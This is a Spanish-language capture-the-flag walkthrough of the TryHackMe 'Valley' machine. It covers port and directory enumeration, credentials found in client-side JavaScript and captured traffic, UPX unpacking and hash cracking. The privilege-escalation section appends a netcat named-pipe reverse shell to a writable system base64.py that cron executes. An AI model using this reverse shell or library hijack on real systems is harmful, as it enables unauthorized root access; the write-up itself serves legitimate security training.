 Bievenidos a otra sala en Tryhackme, maquina recien salida del horno.. por fin pude actualizarme con las maquinas en modo facil. En este caso, escanearemos puetos abiertos y enumeraremos la maquina por posibles vulnerabilidades o pistas para poder acceder a una shell interactiva y reclamar nuestra flag. Luego, escalararemos privilegios explorando un auntenticador con strings, lo descomprimiremos y nos abusaremos de un script modificandolo un poco para generar una reverse shell en nuestra maquina atacante y llegar a usuario de raiz.

# Recon

Iniciamos nuestro reconocimiento utilizando __nmap__. Le diremos que escanee todos los puertos abiertos, con una tasa de paquetes de 5000, en modo sigiloso sin activar las alertas de seguridad y haciendo el escaneo mas rapido, tambien le diremos que no compruebe si el objetivo este en linea, que no resuelva los nombres del host durante el escaneo evitando que los servidores __DNS__ registren el escaneo y haciendo el escaneo mucho mas rapido, tambien que nos muestre la version del servicio, y lo resuelva todo en modo agresivo "__T4__", usamos verbose para ver el progreso del escaneo y que guarde todo el proceso en formato normal, para luego poder echarle un vistazo siempre que querramos. Ejecutaremos nuestro comando : `sudo nmap  -p- --open --min-rate 5000 -sS -Pn -n -sV -T4 -vvv IPTARGET -oN nmap`

```ruby
Nmap scan report for IPTARGET
Host is up, received user-set (0.23s latency).
Scanned at 2023-05-30 18:14:36 EDT for 23s
Not shown: 65530 closed tcp ports (reset), 2 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE REASON         VERSION
22/tcp    open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
37370/tcp open  ftp     syn-ack ttl 63 vsftpd 3.0.3
Service Info: OSs: Linux, Unix; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap

```

Veremos 3 puertos abiertos. Tendremos para utilizar mas adelante el servicio ssh, para empezar a explorar nuestro servidor web y el ultimo puerto que nos reconoce como ftp. Primeramente, exploraremos el servidor web para echarle un vistazo en general. Una vez realizado, empezaremos el proceso de enumeracion

# Intrusion

Utilizaremos nuestra herramienta gobuster para buscar posibles directorios ocultos dentro del servidor web ejecutando `gobuster dir -u http://IPTARGET -w /usr/share/wordlists -t 100` :

```bash
[+] Url:                     http://IPTARGET
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              txt
[+] Timeout:                 10s
===============================================================
2023/05/30 18:18:36 Starting gobuster in directory enumeration mode
===============================================================
/gallery              (Status: 301)
/static               (Status: 301) 
/pricing              (Status: 301) 
```

Encontraremos 3 directorios ocultos. Dentro del directorio **/pricing** , encontraremos una nota dejada para el usuario **J**.

```
J,
Please stop leaving notes randomly on the website
-RP
```

Por lo que podremos deducir que encontraremos posibles notas alojadas en el servidor web. Realizaremos una busqueda mas detallada, con nuestro gobuster, en el directorio **/static**

`gobuster dir -u http://IPTARGET/static -w /usr/share/wordlists -t 100`

```bash
===============================================================
[+] Url:                     http://IPTARGET/static
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              txt
[+] Timeout:                 10s
===============================================================
2023/05/30 18:22:41 Starting gobuster in directory enumeration mode
===============================================================
'/00'                   (Status: 200) [Size: 127]
/3                    (Status: 200) [Size: 421858]
/11                   (Status: 200) [Size: 627909]
/9                    (Status: 200) [Size: 1190575]
/5                    (Status: 200) [Size: 1426557]
/10                   (Status: 200) [Size: 2275927]
/18                   (Status: 200) [Size: 2036137]
/6                    (Status: 200) [Size: 2115495]
/16                   (Status: 200) [Size: 2468462]
/1                    (Status: 200) [Size: 2473315]
```

Ya con dirigirnos al primer directorio encontraremos una nota que nos ayudara a pasar al siguiente escalon.

```bash
dev notes from valleyDev:
-add wedding photo examples
-redo the editing on #4
-remove '/dev1243224123123'
-check fo SIEM alerts
```

Obtenemos un nuevo directorio, que nos llevara a una pagina de logeo. En estos casos, podrias realizar fuerza bruta para tratar de adivirnar las credenciales, pero es un proceso dificil y llevaria tiempo. Por suerte!, hay un metodo mas facil, inspeccionaremos la pagina y buscaremos si se almaceno algun tipo de dato. Haremos la siguiente ruta

`inspeccionar > debugger > carpeta > dev.js`

Encontraremos las credenciales y tambien la ruta donde hay otra nota secreta!

```javascript
if (username === "siemDev" && password === "california") {
        window.location.href = "/dev1243224123123/devNotes37370.txt";
    } else {
        loginErrorMsg.style.opacity = 1;
```

Probamos nuestras credenciales en el servidor web y vemos la nota.

```
dev notes for ftp server:
-stop reusing credentials
-check for any vulnerabilies
-stay up to date on patching
-change ftp port to normal port
```

Pasaremos a la etapa de Intrusion

# Intrusion

Como vimos anteriormente, ya tenemos nuestras credenciales para acceder al servidor ftp que se encuentra abierto, aclaremos que esta abierto en otro puerto y no en el que comunmente conocemos. Asique vamos a ejecutar :

`ftp IPTARGET -p 37370`

Una vez dentro, veremos archivos .pcapng, el cual es trafico capturado que podemos visualizar en nuestro wireshark. Nos transferimos los archivos a nuestra maquina atacante para luego abrirlos : 

```bash
get siemFTP.pcapng
get siemHTTP1.pcapng
get siemHTTP2.pcapng

############

'wireshark siemHTTP2.pcapng'

```

Encontraremos las credenciales ssh en el pcapng marcado. Le diremos a wireshark que nos atrape respuestas "http" con el metodo "POST". Esto facilitara la busqueda ya que estamos capturando el envio de datos al servidor, comunmente se pueden capturar credenciales utilizando este metodo.

			`http.request.method==POST`

Secuestramos las credenciales, podremos utilizar ssh para conectarnos a la maquina victima. `ssh valleyDev@IPTARGET`

# Priv. Escalation

Dentro del directorio **/home**, vemos un auntenticador. Al ejecutarlo, nos pedira username y password para verificar que todo este correcto. SI intentamos poner nuestras credenciales que obtuvimos anteriormente nos dira que son incorrectas.

En este punto, utilizaremos algo de ingenieria inversa para investigar el archivo un poco mas a fondo pero no mucho, utilizando simplemente **strings**, que es un comando que nos permite ver a simple vista lo que contiene y como esta compuesto el archivo.

Antes que nada, como no podremos utilizar strings en la maquina victima, nos transferimos el archivo con un servidor http python:

```python
## Maquina victima

python3 -m http.server 8080

## Maquina atacante

wget http://IPTARGET:8080/valleyAuthenticator

```

Procedemos a ejecutar `strings valletAuthenticator`. Este proceso puede ser arduo y requiere paciencia, tenes que investigar el archivo a fondo para investigarlo  lo mas posible.

Nos toparemos con el siguiente mensaje :

```
$Info: This file is packed with the UPX executable packer http://upx.sf.net $
$Id: UPX 3.96 Copyright (C) 1996-2020 the UPX Team. All Rights Reserved. $
```

Como vemos, el archivo esta empaquetado con el ejecutable UPX, que viene en nuestro sistema Linux. Para descomprimirlo siempre es recomendado consultar con el manual del ejecutable `man upx` y tambien copiaremos el archivo por si surge algun problema tengamos la copia de refuerzo:

```bash
cp valleyAuthenticator valleyAuthenticator2
upx -d valleyAuthenticator

### Volvemos a inspeccionar con strings

strings valleyAuthenticator

```

Para agilizar la busqueda, podemos utilizar grep para cortar fragmentos y encontrar informacion mucho mas rapido

```bash
strings valleyAuthenticator | grep pass
strings valleyAuthenticator | grep username
strings valleyAuthenticator | grep pass -A 5 -B 5

### utilizamos los indicadores -A y -B para mostrar líneas adicionales antes o después de una coincidencia encontrada.
```

Encontramos algun tipo de hash, que si lo utilizamos `hash-identifier` para identificar el tipo de hash, nos saldra que posiblemente pertenezca a MD5. Una forma mas facil es poner los hash en https://crackstation.net y los crackea automaticamente. Obtenemos otro tipo de credencialas en el que podemos utilizar para generar otra conexion ssh y nos auntenticamos con el identificador.

>`ssh valley@IPTARGET`
>`./valleyAuthenticator`
>`Username : valley`
>`Pass: [REDACTED]`

Listamos las actividades programadas cron `cat /etc/crontab` y vemos un script que se ejecuta cada un minuto. Es un script que codifica imagenes en base64. Intente modificar el script queriendo generar una reverse shell pero no tuve exito. 

Enumere un poco mas el sistema, ejecutando `id` pude ver que hay un grupo llamado **valleyAdmin**, asique enumere que permisos tenia este grupo y ver si podia modificar algo para generar una reverse shell y acceder como usuario raiz. 

```bash
### Buscamos permisos 
find / -group valleyAdmin -ls 2>/dev/null

### Permisos encontrados
/usr/lib/python3.8
/usr/lib/python3.8/base64.py
```

Abrimos con nano **base64.py** y agregaremos nuestra reverse shell de la siguiente forma.

```python
### Sin agregar nada, lo encontramos asi 
import re
import struct
import binascii

### Importamos el modulo 'os' en python y ejecutamos nuestra shell con os.system
import re
import struct
import binascii
import os

os.system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc LHOST LPORT >/tmp/f')
```

Somos root!


